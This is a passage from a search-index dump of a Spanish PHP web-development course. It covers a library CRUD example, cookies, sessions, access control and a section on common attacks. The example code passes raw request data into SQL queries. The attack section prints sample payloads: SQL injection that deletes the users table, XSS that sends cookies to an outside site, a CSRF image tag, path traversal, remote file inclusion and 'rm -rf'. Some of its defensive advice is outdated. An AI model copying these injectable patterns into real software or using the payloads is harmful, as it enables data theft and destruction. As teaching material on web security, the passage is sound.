$autoresLibro-&gt;fetch_object()) { $listaAutoresLibro[] = $autor-&gt;idPersona; } // Ya tenemos todos los datos para añadir el selector de autores al formulario echo \"Autores: &lt;select name='autor[]' multiple size='3'&gt;\"; while ($fila = $todosLosAutores-&gt;fetch_object()) { if (in_array($fila-&gt;idPersona, $listaAutoresLibro)) echo \"&lt;option value='$fila-&gt;idPersona' selected&gt;$fila-&gt;nombre $fila-&gt;apellido&lt;/option&gt;\"; else echo \"&lt;option value='$fila-&gt;idPersona'&gt;$fila-&gt;nombre $fila-&gt;apellido&lt;/option&gt;\"; } echo \"&lt;/select&gt;\"; // Por último, un enlace para crear un nuevo autor echo \"&lt;a href='index.php?action=formularioInsertarAutores'&gt;Añadir nuevo&lt;/a&gt;&lt;br&gt;\"; // Finalizamos el formulario echo \" &lt;input type='hidden' name='action' value='modificarLibro'&gt; &lt;input type='submit'&gt; &lt;/form&gt;\"; echo \"&lt;p&gt;&lt;a href='index.php'&gt;Volver&lt;/a&gt;&lt;/p&gt;\"; break; // --------------------------------- MODIFICAR LIBROS ---------------------------------------- case \"modificarLibro\": echo \"&lt;h1&gt;Modificación de libros&lt;/h1&gt;\"; // Vamos a procesar el formulario de modificación de libros // Primero, recuperamos todos los datos del formulario $idLibro = $_REQUEST[\"idLibro\"]; $titulo = $_REQUEST[\"titulo\"]; $genero = $_REQUEST[\"genero\"]; $pais = $_REQUEST[\"pais\"]; $ano = $_REQUEST[\"ano\"]; $numPaginas = $_REQUEST[\"numPaginas\"]; $autores = $_REQUEST[\"autor\"]; // Lanzamos el UPDATE contra la base de datos. $db-&gt;query(\"UPDATE libros SET titulo = '$titulo', genero = '$genero', pais = '$pais', ano = '$ano', numPaginas = '$numPaginas' WHERE idLibro = '$idLibro'\"); if ($db-&gt;affected_rows == 1) { // Si la modificación del libro ha funcionado, continuamos actualizando la tabla \"escriben\". // Primero borraremos todos los registros del libro actual y luego los insertaremos de nuevo $db-&gt;query(\"DELETE FROM escriben WHERE idLibro = '$idLibro'\"); // Ya podemos insertar todos los autores junto con el libro en \"escriben\" foreach ($autores as $idAutor) { $db-&gt;query(\"INSERT INTO escriben(idLibro, idPersona) VALUES('$idLibro', '$idAutor')\"); } echo \"Libro actualizado con éxito\"; } else { // Si la modificación del libro ha fallado, mostramos mensaje de error echo \"Ha ocurrido un error al modificar el libro. Por favor, inténtelo más tarde.\"; } echo \"&lt;p&gt;&lt;a href='index.php'&gt;Volver&lt;/a&gt;&lt;/p&gt;\"; break; // --------------------------------- BUSCAR LIBROS ---------------------------------------- case \"buscarLibros\": // Recuperamos el texto de búsqueda de la variable de formulario $textoBusqueda = $_REQUEST[\"textoBusqueda\"]; echo \"&lt;h1&gt;Resultados de la búsqueda: \\\"$textoBusqueda\\\"&lt;/h1&gt;\"; // Buscamos los libros de la biblioteca que coincidan con el texto de búsqueda if ($result = $db-&gt;query(\"SELECT * FROM libros INNER JOIN escriben ON libros.idLibro = escriben.idLibro INNER JOIN personas ON escriben.idPersona = personas.idPersona WHERE libros.titulo LIKE '%$textoBusqueda%' OR libros.genero LIKE '%$textoBusqueda%' OR personas.nombre LIKE '%$textoBusqueda%' OR personas.apellido LIKE '%$textoBusqueda%' ORDER BY libros.titulo\")) { // La consulta se ha ejecutado con éxito. Vamos a ver si contiene registros if ($result-&gt;num_rows != 0) { // La consulta ha devuelto registros: vamos a mostrarlos // Primero, el formulario de búsqueda echo \"&lt;form action='index.php'&gt; &lt;input type='hidden' name='action' value='buscarLibros'&gt; &lt;input type='text' name='textoBusqueda'&gt; &lt;input type='submit' value='Buscar'&gt; &lt;/form&gt;&lt;br&gt;\"; // Después, la tabla con los datos echo \"&lt;table border ='1'&gt;\"; while ($fila = $result-&gt;fetch_object()) { echo \"&lt;tr&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;titulo . \"&lt;/td&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;genero . \"&lt;/td&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;numPaginas . \"&lt;/td&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;nombre . \"&lt;/td&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;apellido . \"&lt;/td&gt;\"; echo \"&lt;td&gt;&lt;a href='index.php?action=formularioModificarLibro&amp;idLibro=\" . $fila-&gt;idLibro . \"'&gt;Modificar&lt;/a&gt;&lt;/td&gt;\"; echo \"&lt;td&gt;&lt;a href='index.php?action=borrarLibro&amp;idLibro=\" . $fila-&gt;idLibro . \"'&gt;Borrar&lt;/a&gt;&lt;/td&gt;\"; echo \"&lt;/tr&gt;\"; } echo \"&lt;/table&gt;\"; } else { // La consulta no contiene registros echo \"No se encontraron datos\"; } } else { // La consulta ha fallado echo \"Error al tratar de recuperar los datos de la base de datos. Por favor, inténtelo más tarde\"; } echo \"&lt;p&gt;&lt;a href='index.php?action=formularioInsertarLibros'&gt;Nuevo&lt;/a&gt;&lt;/p&gt;\"; echo \"&lt;p&gt;&lt;a href='index.php'&gt;Volver&lt;/a&gt;&lt;/p&gt;\"; break; // --------------------------------- ACTION NO ENCONTRADA ---------------------------------------- default: echo \"&lt;h1&gt;Error 404: página no encontrada&lt;/h1&gt;\"; echo \"&lt;a href='index.php'&gt;Volver&lt;/a&gt;\"; break; } // switch ?&gt; &lt;/body&gt; &lt;/html&gt; . ``` . ",
    "url": "https://iescelia.org/docs/dwes/_site/php/ejercicios-resueltos.html#28-ejercicios-resueltos",
    "relUrl": "/php/ejercicios-resueltos.html#28-ejercicios-resueltos"
  },"17": {
    "doc": "2.8 Ejercicios resueltos",
    "title": "2.8 Ejercicios resueltos",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/php/ejercicios-resueltos.html",
    "relUrl": "/php/ejercicios-resueltos.html"
  },"18": {
    "doc": "2 Introducción a PHP",
    "title": "2. Introducción a PHP",
    "content": "En este capítulo te voy a presentar a un amigo íntimo: el lenguaje PHP. Veremos la sintaxis básica y cómo este lenguaje trabaja en el lado del servidor para ayudarnos a crear aplicaciones web dinámicas, es decir, aplicaciones que generan un HTML distinto según los datos de entrada y el estado del servidor. También conoceremos el kit de herramientas básico que vamos a necesitar para convertirnos en desarrolladores/as web y nos conectaremos a una base de datos remota para enviar y recuperar información. Por último, veremos algunos ejemplos de aplicaciones web sencillas que puedes utilizar como base para tus propios desarrollos. Esta será una práctica habitual a lo largo de todo este curso de programación: siempre ofreceremos ejemplos de código real para comprender y aplicar la parte más “teórica”. Y, por supuesto, no te escaparás sin desarrollar tus primeras aplicaciones web. ",
    "url": "https://iescelia.org/docs/dwes/_site/php/#2-introducci%C3%B3n-a-php",
    "relUrl": "/php/#2-introducción-a-php"
  },"19": {
    "doc": "2 Introducción a PHP",
    "title": "2 Introducción a PHP",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/php/",
    "relUrl": "/php/"
  },"20": {
    "doc": "3.1 Cookies",
    "title": "3.1. Cookies",
    "content": ". | 3.1.1. ¿Qué son las cookies? | 3.1.2. Manejando cookies con PHP | . En esta sección vamos a ver qué son las cookies y cómo podemos acceder a ellas para crearlas o manipularlas desde PHP. 3.1.1. ¿Qué son las cookies? . Las cookies son pequeños archivos de texto enviados desde el servidor que se almacenan en el lado del cliente. Es decir, en el navegador. Permiten guardar información de forma persistente, de manera que se mantenga entre una petición al servidor y otra. Una cookie puede estar viva durante minutos, horas, días o incluso indefinidamente. Desde PHP, se pueden usar las cookies usando la función setcookie() y el array global $_COOKIE. Vamos a ver cómo. 3.1.2. Manejando cookies con PHP . Enviar una cookie: setcookie() . Esta función define una cookie que se enviará al cliente junto con el resto de las cabeceras de HTTP. Devuelve true si la cookie se envía con éxito o false en caso contrario. Su sintaxis es: . bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] ) . Las cookies deben enviarse antes de que el programa genere ninguna salida. Esto no es un capricho de PHP, sino una restricción del protocolo http. Por lo tanto, debes llamar a esta función antes de hacer cualquier salida, incluidos espacios en blanco. En caso contrario, la cookie no estará disponible hasta que la página se recargue. La función setcookie() admite un montón de parámetros, la mayor parte de ellos optativos: . | name: El nombre de la cookie. Este es el único obligatorio. | value: El valor de la cookie. | expire: El tiempo que la cookie tardará en expirar. Se trata de una fecha expresada en formato Unix. | path: La ruta del servidor para la que la cookie estará disponible. Si se utiliza ‘/’, la cookie estará disponible en la totalidad del dominio. | domain: El dominio para el cual la cookie está disponible. | secure: Si la cookie solo debería enviarse en caso de conexión https, pon este argument a true. | httponly: Esta cookie solo será accesible a través de http. Es decir, no podrá accederse a la cookie desde Javascript. | . Aquí tienes tres ejemplos de envío de la misma cookie: . &lt;?php $value = \"I'm your father\"; setcookie(\"VaderQuote\", $value); setcookie(\"VaderQuote\", $value, time()+3600); // la cookie expira en una hora setcookie(\"VaderQuote\", $value, time()+3600, \"/quotes/\", \"bestquotes.com\", 1); ?&gt; . Recuperar una cookie: $_COOKIES[] . Para ver el contenido de una cookie, simplemente hay que acceder al array global $_COOKIES. Por ejemplo: . &lt;?php // Imprimir una cookie individual echo $_COOKIE[\"VaderQuote\"]; ?&gt; . Borrar una cookie . Para forzar el borrado de una cookie en el cliente basta con enviarla con una fecha de expiración anterior a la fecha actual. Por ejemplo: . &lt;?php setcookie (\"VaderQuote\", \"\", time() - 3600); // Establece la fecha de expiración una hora en el pasado ?&gt; . ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/cookies.html#31-cookies",
    "relUrl": "/cookies-sesiones-seguridad/cookies.html#31-cookies"
  },"21": {
    "doc": "3.1 Cookies",
    "title": "3.1 Cookies",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/cookies.html",
    "relUrl": "/cookies-sesiones-seguridad/cookies.html"
  },"22": {
    "doc": "3.2 Sesiones",
    "title": "3.2. Sesiones",
    "content": ". | 3.2.1. ¿Qué es eso de las variables de sesión? | 3.2.2. Abrir sesiones: session_start() | 3.2.3. Usar variables de sesión: $_SESSION | 3.2.4. Eliminar variables de sesión: unset() y session_destroy() | . En esta sección vamos a aprenderlo todo (bueno, o casi todo) sobre las variables de sesión en PHP. 3.2.1. ¿Qué es eso de las variables de sesión? . Las sesiones de PHP son un mecanismo para que un script almacene variables (llamadas variables de sesión) en el servidor de manera persistente, de modo que posteriores ejecuciones de programas en el servidor solicitadas desde el mismo cliente pueden acceder a esas variables. Es decir: en la práctica, las variables de sesión se comportan como si fueran variables globales a toda la aplicación web. Seguro que te habían dicho que usar variables globales es una mala idea y una pésima práctica de programación. Eso es cierto y, al mismo tiempo, usarlas resulta inevitable. Bienvenido/a al extravagante mundo de las aplicaciones web. Por ese motivo, debe reducirse el uso de las variables de sesión a lo estrictamente imprescindible. ¿Qué cosas resulta útil guardar en variables de sesión? Cosas como el ID o el nombre de un usuario logueado en un sistema o el estado de la aplicación. Poco más. Cosas pequeñas pero tremendamente importantes. Cada cliente tiene su propio espacio de variables de sesión en el servidor, de manera que no se mezclan unas con otras, ni un cliente puede acceder a las variables de otro cliente. La forma en la que PHP logra distinguir a los clientes entre sí es enviándoles, de forma transparente, una cookie con un valor aleatorio distinto para cada cliente. “De forma transparente” significa que ni el programador ni el usuario se enteran de que esa cookie existe: PHP se encarga de hacerlo por su cuenta. En el archivo php.ini se puede configurar la manera en la que PHP almacenará las variables de sesión (en memoria, en un fichero, etc), pero esto es irrelevante de cara a su funcionamiento y compete más al administrador del sistema que al programador. Lo que a nosotros nos interesa es aprender a crear variables de sesión, asignarles valor y recuperarlo posteriormente. 3.2.2. Abrir sesiones: session_start() . Antes de acceder a cualquier variable de sesión (ya sea para crearla, para modificarla o para eliminarla) necesitamos indicarle a PHP que queremos usar variables de sesión en ese programa. La función session_start() se usa para eso: habilita el acceso a las variables de sesión, es decir, crea una nueva sesión o reanuda una sesión preexistente. Las sesiones admiten un nombre, por si necesitas crear sesiones separadas para el mismo cliente. No obstante, la mayor parte de las veces te bastará con crear sesiones sin nombre, sin necesidad de pasar ningún argumento a session_start(). 3.2.3. Usar variables de sesión: $_SESSION . Las variables de sesión se manipulan a través del array superglobal $_SESSION. Si necesitas una variable de sesión llamada, por ejemplo, nombre_usuario, simplemente haz esto: . session_start(); $_SESSION['nombre_usuario'] = \"valor-de-la-variable\"; . Por supuesto, el valor de esa posición del array $_SESSION puede consultarse o modificarse cuando lo necesitemos, porque se trata de un array como otro cualquiera… salvo que es superglobal, es decir, es accesible desde cualquier punto del programa. 3.2.4. Eliminar variables de sesión: unset() y session_destroy() . La función unset() se utiliza para destruir cualquier variable, incluidas las de sesión: . unset($_SESSION['nombre_usuario']); . Si lo que deseas es destruir todas las variables de sesión, es preferible recurrir a session_destroy(). Ahora bien, session_destroy() destruye la información asociada a la sesión actual, pero no elimina realmente las variables de la memoria del servidor ni borra la cookie de sesión del cliente. Si eres un fanático de la seguridad y quieres asegurarte de destruir todas las variables de sesión, puedes usar la función session_unset(). Y, para borrar la cookie de sesión, debes usar setcookie(), como en este ejemplo: . &lt;?php session_start(); // Destruimos todas las variables de sesión (optativo) session_unset(); // Si queremos destruir la sesión completamente, borramos también la cookie de sesión. $params = session_get_cookie_params(); setcookie(session_name(), '', time() - 42000, $params[\"path\"], $params[\"domain\"], $params[\"secure\"], $params[\"httponly\"] ); // Finalmente, cerramos 0la sesión session_destroy(); ?&gt; . ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/sesiones.html#32-sesiones",
    "relUrl": "/cookies-sesiones-seguridad/sesiones.html#32-sesiones"
  },"23": {
    "doc": "3.2 Sesiones",
    "title": "3.2 Sesiones",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/sesiones.html",
    "relUrl": "/cookies-sesiones-seguridad/sesiones.html"
  },"24": {
    "doc": "3.3. Sesiones, cookies y control de acceso",
    "title": "3.3. Control de acceso a las aplicaciones web",
    "content": "Cookies y variables de sesión se usan a menudo, por separado o de forma combinada, para controlar el acceso a una aplicación web. Es decir, para hacer el login. En este punto conviene que te hagas esta pregunta: ¿qué significa “loguearse” en una aplicación? . Piénsalo un momento. ¿Qué significa eso realmente? . Por supuesto, implica superar un formulario donde se nos pregunta nuestro nombre de usuario (o nuestro email, o alguna otra identificación) y una contraseña. Pero, si lo superamos, ¿qué sucede entonces? . Autenticarse o “loguearse” en una aplicación significa que esa aplicación cambia de estado y pasa a reconocernos como usuarios registrados. Algo tiene que cambiar dentro de la aplicación, porque a partir de ese momento, y solo para nosotros, se comportará de un modo distinto. Ese “algo” implica que la aplicación recordará quiénes somos nosotros y cuales son nuestros privilegios en la aplicación hasta que cerremos la sesión. Y sobre nosotros puede recordar muchas cosas: el nombre, los apellidos, nuestra foto de perfil… Pero, sobre todas esas cosas, hay una fundamental: nuestro ID de usuario. Todos los usuarios registrados tienen un ID en todos los sistemas. A la aplicación le basta con conocer nuestro ID para recordar quiénes somos. ¿Y cómo “recuerda” una aplicación web un dato como ese? Muy fácil: almacenándolo en una cookie o en una variable de sesión, que son persistentes hasta que el programa decide destruirlas. Es decir, cuando el usuario abandona la aplicación, el programa debe destruir la cookie o destruir la sesión. Justo en este momento hay una cosa que tiene que quedarte muy clara: ¡ninguno de estos métodos es completamente seguro!. Las cookies pueden rastrearse o modificarse en el ordenador del cliente. Además, algunos clientes las tienen desactivadas. ¡No te puedes fiar de ellas! . Las variables de sesión, en principio más seguras, pueden ser atacadas capturando el ID de sesión, como veremos más adelante. El método más seguro, y el más complicado de programar, es el que combina: . | Cookies y/o variables de sesión. | Variables guardadas en una tabla de la BD. | . El uso de frameworks solventes (como Laravel, que estudiaremos más adelante) hace innecesario tomarse este trabajo, puesto que todos habilitan un mecanismo de sesiones seguras que mejora notablemente las prestaciones de las sesiones nativas de PHP. No obstante, en las actividades resueltas y propuestas del final del tema plantearemos una solución para la autenticación de usuarios desarrollada por nosotros mismos y que resultará razonablemente segura. ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/control-de-acceso.html#33-control-de-acceso-a-las-aplicaciones-web",
    "relUrl": "/cookies-sesiones-seguridad/control-de-acceso.html#33-control-de-acceso-a-las-aplicaciones-web"
  },"25": {
    "doc": "3.3. Sesiones, cookies y control de acceso",
    "title": "3.3. Sesiones, cookies y control de acceso",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/control-de-acceso.html",
    "relUrl": "/cookies-sesiones-seguridad/control-de-acceso.html"
  },"26": {
    "doc": "3.4 Técnicas de ataque frecuentes",
    "title": "3.4. Técnicas de ataque frecuentes",
    "content": ". | 3.4.1. Captura de ID de sesión | 3.4.2. Inyección de SQL | 3.4.3. XSS (cross site scripting) | 3.4.4. CSRF o XSRF (cross site request forgery) | 3.4.5. DT (directory transversal) | 3.4.6. RFI (remote file inclusion) | . Cualquier aplicación web, por el mero hecho de estar abierta a recibir información procedente de la red, es susceptible de ser atacada. Y te aseguro que, antes o después, cualquier aplicación que esté online acaba por ser atacada. Es una certeza matemática. En esta sección vamos a describir qué tipos de ataque son los más frecuentes. Aunque proporcionaremos algunas estrategias de defensa (que debes tener en cuenta en tus desarrollos), hay una idea común a todas: lo más seguro es utilizar un framework como Laravel, Symfony o Zend, debidamente actualizado. Los mecanismos de seguridad que implementan estos frameworks son suficientes para la mayor parte de los casos y se mejoran cada vez que se descubre una vulnerabilidad. Aún así, conviene que conozcas con qué tipos de ataque te vas a encontrar y cuales son las formas de defenderse de ellos. (Esta sección está adaptada de securitybydefault.com) . 3.4.1. Captura de ID de sesión . Como ya hemos visto, el ID de una sesión se guarda como una cookie (llamada generalmente phpsessid) en el cliente para distinguir a ese cliente de otros a la hora de acceder a las variables de sesión. Por lo tanto, viaja en el paquete http desde el servidor hasta el cliente. Un atacante que esté escuchando en esa red puede leer la cookie con el ID de sesión del paquete http y, de ese modo, suplantar la identidad de la persona que inició la sesión. También puede inyectar Javascript a su víctima para capturar de ese modo el ID de sesión, con idénticos resultados. Por último, si el atacante consigue tener acceso, aunque sea por unos minutos, al ordenador de su víctima, puede robar el ID de sesión (que en el cliente siempre se almacena como texto plano) y suplantarlo con toda comodidad. Soluciones: . | Combinar las variables de sesión con cookies o con entradas en la base de datos. | Cambiar el ID de sesión periódicamente. | No confiar en variables de sesión de PHP para almacenar información muy sensible. | Denegar el acceso a la cookie de sesión desde Javascript (usando el atributo httponly). | Acceder solo a webs que usen https, no http. De ese modo, la cookie de sesión viaja encriptada hasta el navegador. Este es uno de los muchos motivos por los que https se ha impuesto definitivamente a lo largo y ancho de la web. | . 3.4.2. Inyección de SQL . Este ataque consiste en que un usuario malintencionado ejecuta sentencias SQL contra la base de datos del sitio web mediante el simple procedimiento de insertarlas en un formulario. ¿Qué cómo narices se hace eso? Te lo explico con un ejemplo. Imagina que nuestro atacante ha hecho la suposición de que nuestra tabla de usuarios se llama users (una suposición muy razonable). Entonces, el tío, o la tía, llega al formulario de login de la aplicación, donde se nos pide el nick y la contraseña, y escribe esto en el campo nick: . Cuando pulse el botón “Sign in” ocurrirá algo muy curioso… y muy desagradable. Dentro de nuestro código fuente, seguramente tendremos una línea parecida a esta: . $sql = \"SELECT * FROM users WHERE nick = '$nick' and passwd = '$pass'\"; . Fíjate otra vez en lo que el atacante ha escrito en el campo nick del formulario de login. Eso significa que la variable $nick tendrá este contenido: nada'; DELETE * FROM users; #. Imagina lo que va a suceder cuando esa variable se expanda dentro de la sentencia SQL anterior. ¿Te lo has imaginado ya? . Por si acaso aún no lo has pillado, te lo chivo. Lo que sucederá es que, al expandir la variable $nick en ese string, la variable $sql pasará a tener este valor: . SELECT * FROM users WHERE nick ='nada'; DELETE * FROM users; #'and passwd = '$pass' . (He puesto en negrita el contenido de la variable $nick expandido dentro del string $sql) . Es decir, que el atacante ha logrado convertir un inofensivo SELECT en una secuencia de dos instrucciones. Y una de ellas no es nada inofensiva. En efecto, cuando pidamos a la base de datos que ejecute ese SQL, las sentencias se ejecutarán en orden. El primer SELECT no devolverá ningún resultado, pero es sintácticamente correcto y, en cualquier caso, al atacante no le interesan esos resultados. Como el SELECT es sintácticamente correcto, la base de datos no se detendrá ahí, sino que seguirá ejecutando las sentencias. Y le llegará el turno al DELETE. ¡Bingo! El simpático atacante acaba de cepillarse nuestra tabla de usuarios. (Lo que haya a continuación del símbolo # se ignorará, porque ese es el símbolo de comentario en SQL). El atacante no solo puede ejecutar un DELETE mediante este sencillo procedimiento, sino que puede llevar a cabo otras acciones destructivas (¿qué tal un DROP DATABASE?) o instrusivas (puede intentar insertar un usuario administrador fraudulento en la tabla users, por ejemplo). Y todo ello partiendo de una suposición bastante plausible: que la tabla de usuarios se llama users. Para blindarse frente a inyecciones de SQL, se recomienda: . | Filtrar los datos procedentes de los formularios. SIEMPRE. Por ejemplo, si los nombres de usuario sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como comillas, puntos y coma, asteriscos, almohadillas, etc. Vimos cómo se valida y se sanea un formulario en el tema anterior. | Escapar los caracteres especiales de cualquier dato de entrada antes de enviarlo al gestor de bases de datos. Por ejemplo, mysql_real_escape_string() coloca barras invertidas antes de ciertos caracteres. addslashes() hace algo parecido. Esto hace que ya no se ejecuten como sentencias SQL. En las versiones recientes de PHP, el escape de caracteres especiales se hace automáticamente con cualquier dato que llegue por GET o POST. | Usar nombres poco habituales para las tablas de la base de datos. Una estrategia frecuente es utilizar un identificador significativo (como users para la tabla de usuarios) y añadirle varios caracteres o números aleatorios (así, la tabla se convertiría en algo como users_58283). Ese sufijo aleatorio se suele almacenar en un archivo de configuración para que esté accesible para todos los scripts del programa. Esta técnica tan simple dificulta enormemente cualquier intento de acceso fraudulento a las tablas. | . 3.4.3. XSS (cross site scripting) . El ataque por XSS consiste en ejecutar código de scripting malicioso (básicamente, Javascript) en el contexto del sitio web. Hay muchas formas de hacer XSS. Por ejemplo, imagínate que tenemos un blog de noticias y que un usuario malicioso publica, como parte del texto de una entrada, este string: . &lt;script&gt;document.href = 'https://otrositio.com';&lt;/script&gt; . ¿Qué ocurriría? Pues que cada vez que alguien visite nuestro portal y cargue esa noticia, será redirigido a otrositio.com, donde probablemente pretenderán venderle medicamentos para la disfunción eréctil o algo por el estilo. Otra cosa que suele hacerse con XSS es robar datos de las cookies del cliente, aprovechando que Javascript puede acceder a las cookies. Para ello, el atacante solo tiene que inyectar un código como este: . &lt;script&gt;document.location = 'https://otrositio.com?cookies=' + document.cookie&lt;/script&gt; . Para evitar los ataques XSS, la estrategia más útil, otra vez, es filtrar y validar todos los datos externos. El filtrado de datos es sencillo de hacer y te ahorrará mogollón de problemas. En resumen: nunca te fíes de ningún dato que provenga de un formulario si no lo has saneado antes y le has quitado todos los caracteres sospechosos. 3.4.4. CSRF o XSRF (cross site request forgery) . Este tipo de ataques explota la confianza que tiene un sitio web en la identidad de un usuario. Es decir, se toma a un usuario válido registrado en un sitio (por ejemplo, sitio-confiable.com) y, desde otro sitio (por ejemplo, sitio-maligno.com), se le fuerza a hacer algo chungo en sitio-confiable.com. Veámoslo con un ejemplo. Supón que eres un usuario administrador en sitio-confiable.com. Para borrar a un usuario de tu web (o cualquier otro recurso), lanzas una URL como https://sitio-confiable.com/usuario/delete/28 (donde 28 es el id del usuario). Este tipo de URLs son muy habituales en las aplicaciones web. Pues bien, imagina que has abierto una sesión como administrador en sitio-confiable.com y, sin cerrarla, navegas por otra web llamada sitio-maligno.com. Y un atacante supermalvado, conocedor de tu propensión a navegar por sitios chungos sin cerrar la sesión en sitio-confiable.com, ha colocado este código como parte del código fuente de sitio-maligno.com: . &lt;img src='https://sitio-confiable.com/usuario/delete/28'&gt; . Cuando tu navegador cargue esa página, lanzará una petición GET a sitio-confiable.com, resultando en la eliminación del usuario 28 sin que tú te enteres de cómo ha podido suceder semejante desgracia. Esto es solo un ejemplo. Por supuesto, el atacante puede hacer un montón de cosas desagradables en sitio-confiable.com, porque ese sitio está confiando en ti, que eres un usuario legítimo con una sesión abierta. Puedes pensar: ¿y quién demonios se va a dejar una sesión abierta y se va a poner a navegar por otros sitios sin cerrarla? Respuesta: todo el mundo. Si tú no lo has hecho nunca, aunque solo haya sido una vez, probablemente no perteneces a la especie humana. Algunas técnicas para dificultar el ataque por CSRF: . | Utilizar POST en lugar de GET para recibir datos. | Generar tokens únicos para cada petición. Un tóken es una cadena alfanumérica aleatoria generada por el servidor cuando sirve el código HTML de un formulario. El cliente debe enviar de vuelta ese tóken junto con los datos del formulario para que el servidor acepte la petición como válida. Si un atacante intenta efectuar un ataque CSRF, enviará sus peticiones sin el tóken y serán rechazadas. | . 3.4.5. DT (directory transversal) . Este ataque se produce cuando el atacante logra acceder a ficheros del servidor que están fuera del directorio de la aplicación y que, teóricamente, no deberían ser accesibles desde esta. Es fácil comprender cómo puede montarse un ataque así. Imagina un programa PHP que haga un include() de este estilo: . include (\"views/\" . $viewName); . Si un atacante logra manipular la variable $viewName para asignarle, por ejemplo, el valor “../../../../otro-fichero.php”, nuestro programa hará un include de un fichero que está claramente fuera de los directorios de la aplicación. Para evitar este tipo de ataques, algunas estrategias son: . | Tener un array de páginas y carpetas válidas. Si un include trata de acceder a un recurso que no está en la lista, se sospechará de un ataque. | Buscar caracteres sospechosos en los nombres de los archivos. Es decir, sanear los formularios. Por ejemplo, si la variable $viewName del ejemplo anterior incluye los caracteres “../”, la cosa se pone fea. No en vano, el ataque Directory Transversal también se denomina “ataque punto punto barra”. | . 3.4.6. RFI (remote file inclusion) . Este ataque se produce cuando se incluye un archivo remoto explotando una vulnerabilidad del código fuente. Imagina, como antes, un programa PHP que haga un include() tan común como este: . include ($viewName); . Imagina también que este código se invoque normalmente mediante una petición del estilo: https://sitio-confiable.com?view=main.php. O algo parecido. Es una estrategia habitual en muchas aplicaciones web. Pues bien, un atacante podría pedir la siguiente URL: https://sitio-confiable.com?view=https://sitio-malicioso/soy-un-script-malvado.php . Es decir, ha colocado como $viewName la URL de un programa PHP externo a nuestro servidor, y nuestro programa hará un include() de ese código tan feliz y contento, sin saber que se trata de código malicioso que acabará directamente en las tripas de nuestro programa. Una vez que soy-un-script-malvado.php se esté ejecutando en el servidor sitio-confiable.com, puede hacer cosas terribles, como, por ejemplo, esta: . &lt;?php system(\"rm -rf\"); ?&gt; . (No te digo lo que hace ese comando por si se te ocurre probarlo, pero ya te adelanto que no es agradable). Para prevenir los ataques por RFI, algunas estrategias válidas son: . | No confiar en los datos que no provengan de nuestro sistema. | Validar y filtrar los datos que introduce el usuario (sí, otra vez: validar, validar y validar cualquier cosa que provenga del usuario). | . ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/tecnicas-de-ataque-frecuentes.html#34-t%C3%A9cnicas-de-ataque-frecuentes",
    "relUrl": "/cookies-sesiones-seguridad/tecnicas-de-ataque-frecuentes.html#34-técnicas-de-ataque-frecuentes"
  },"27": {
    "doc": "3.4 Técnicas de ataque frecuentes",
    "title": "3.4 Técnicas de ataque frecuentes",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cookies-sesiones-seguridad/tecnicas-de-ataque-frecuentes.html",
    "relUrl": "/cookies-sesiones-seguridad/tecnicas-de-ataque-frecuentes.html"
  },"28": {
    "doc": "3.5 Autenticación mediante ACL",
    "title": "3.5. Autenticación mediante ACL",
    "content": ". | 3.5.1. Qué es la autenticación mediante ACL | 3.5.2. Una implementación de autenticación mediante ACL | . En esta sección, vamos a poner en práctica muchas de las cosas que hemos visto en este tema mediante un caso práctico realista y completamente resuelto. Completamente resuelto pero mejorable, porque una aplicación informática siempre se puede mejorar. De hecho, en la sección de “Ejercicios propuestos” afrontaremos varias mejoras que tendrás que intentar tú en forma de ejercicios propuestos. ¿O pensabas que iba a hacer yo todo el trabajo? . 3.5.1. Qué es la autenticación mediante ACL . Casi todas las aplicaciones web incluyen un subsistema de autenticación de usuarios. El más completo de esos subsistemas es el de las lisas de control de acceso (ACL = Access Control List). Ese subsistema suele estar basado en este diseño de base de datos: . Esto significa que necesitamos cinco tablas para implementar un ACL completo. Sin embargo, muchas veces tendremos suficiente con solo tres tablas (users, roles y roles-users), o incluso solo con una (users, añadiendo quizá un campo “type”). Optar por una solución más o menos compleja dependerá del tipos de sistema que estemos implementando. En cualquier caso, es conveniente que conozcas el esquema ACL completo (es decir, el de 5 tablas) para que lo pongas en práctica cuando lo necesites. Por eso te lo he presentado. Ahora ya sois oficialmente amigos. 3.5.2. Una implementación de autenticación mediante ACL . Como ocurre con muchos conceptos en el ámbito de la programación, las ACL se entienden mejor viéndolas que explicándolas. Así que vamos a hacer una implementación de ejemplo, que de paso nos servirá para mostrar en acción muchas de las cosas que hemos visto en este tema. Ojo, que esta es solo una de las posibles implementaciones. Pueden existir mil variaciones. Pero, como sucedía con los ejemplos que hemos visto anteriormente, te servirá como base para tu propia implementación de una ACL. IMPORTANTE: en esta implementación verás una distribución de archivos un poco peculiar y que, a primera vista, puede resultarte hasta caprichosa. No te agobies. Hemos respetado una arquitectura de aplicaciones denominada modelo-vista-controlador o MVC. Hablaremos largo y tendido sobre esa arquitectura más adelante, y entonces comprenderás que la distribución del código no tenía nada de caprichosa. Por ahora, solo tienes que seguir la pista a lo que sucede, y ni siquiera es necesario que lo entiendas al 100%. Un 80% ya estaría genial. Un 50% sería suficiente. Tu comprensión de este código aumentará cuando tengas que utilizarlo y adaptarlo a tus propios proyectos. Nuestras tablas ACL . Vamos a suponer que esta autenticación con ACL se está implementando para un sistema de publicación de noticias (un blog, un periódico digital o algo semejante). Solo por darle un poco de contexto. Realmente, cambiando los permisos, podría utilizarse casi para cualquier web. Haremos una implementación completa del ACL, es decir, con las cinco tablas. Esas cinco tablas tendrán el siguiente aspecto (te 